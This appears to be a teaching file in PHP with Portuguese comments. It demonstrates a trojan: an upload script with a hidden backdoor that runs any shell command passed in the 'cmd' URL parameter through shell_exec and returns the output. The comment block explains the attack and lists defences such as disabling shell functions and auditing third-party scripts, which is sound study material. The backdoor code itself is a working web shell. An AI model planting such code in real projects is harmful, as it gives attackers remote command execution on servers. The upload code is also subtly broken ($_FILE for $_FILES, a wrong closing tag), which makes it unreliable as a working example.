/*
Como isso funciona?
Parte legítima: O script realiza uma funcionalidade esperada,
 como o upload de arquivos.

Parte maliciosa: Um invasor pode acessar o script passando o parâmetro cmd na URL, 
como: http://exemplo.com/upload.php?cmd=ls

Nesse caso, o servidor executa o comando ls (que lista arquivos em sistemas baseados
em Unix/Linux) e retorna o resultado ao invasor.

Proteções contra Cavalos de Troia em PHP
Sanitizar entradas:
Sempre valide e sanitizar dados de entrada usando funções como filter_input() 
ou htmlspecialchars().

Desativar funções perigosas:
Configure o php.ini para desativar funções como exec, shell_exec, e system, que 
permitem executar comandos no servidor.

Auditar códigos desconhecidos:
Nunca use scripts de terceiros sem revisar o código e entender o que ele faz.

Configuração do servidor:
Use permissões rigorosas para evitar uploads arbitrários e desative a execução de 
scripts PHP em diretórios de upload.
*/


<?php
// Script aparentiment inofensivo...

if (isset($_FILES['file'])) {
    $uploadDir = 'uploads/';
    $filePath = $uploadDir . basename($_FILES['file']['name']);

    if (move_uploaded_file($_FILE['file']['tmp_name'], $filePath)) {
        echo "Upload feito com sucesso!";
    } else {
        echo "Erro no upload!";
    }
}

// Parte oculta: Cavalo de troia
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd']; // Captura um comando do invasor 
    echo "<pre>" . shell_exec($cmd) . "<pre>"; // Executa o comando no servidor.
}

?>